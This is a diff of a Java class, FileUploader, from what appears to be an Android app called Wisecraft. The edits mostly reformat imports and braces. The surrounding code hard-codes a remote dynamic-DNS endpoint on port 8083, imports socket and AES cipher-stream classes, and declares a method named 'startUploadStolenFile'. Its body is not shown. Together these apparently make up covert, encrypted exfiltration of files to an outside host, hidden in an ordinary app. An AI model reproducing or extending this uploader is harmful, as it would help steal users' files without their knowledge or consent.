@@ -1,23 +1,25 @@
 package com.nao20010128nao.Wisecraft.misc;
 import java.io.*;
-import java.net.*;
-import java.util.*;
-import java.security.*;
-import com.nao20010128nao.Wisecraft.*;
-import javax.crypto.*;
-import javax.crypto.spec.*;
 
-public class FileUploader
-{
+import com.nao20010128nao.Wisecraft.Factories;
+import java.net.Socket;
+import java.security.SecureRandom;
+import java.util.UUID;
+import javax.crypto.Cipher;
+import javax.crypto.CipherOutputStream;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+
+public class FileUploader {
 	private static final String ENDPOINT = "nao20010128nao.dip.jp";
 	private static final int ENDPOINT_PORT = 8083;
 	public UUID uuid;
 	SecureRandom sr=new SecureRandom();
-	
-	public FileUploader(UUID uuid){
-		this.uuid=uuid;
+
+	public FileUploader(UUID uuid) {
+		this.uuid = uuid;
 	}
-	public FileUploader(String s){
+	public FileUploader(String s) {
 		this(UUID.fromString(s));
 	}
 	public OutputStream startUploadStolenFile(String filename) {
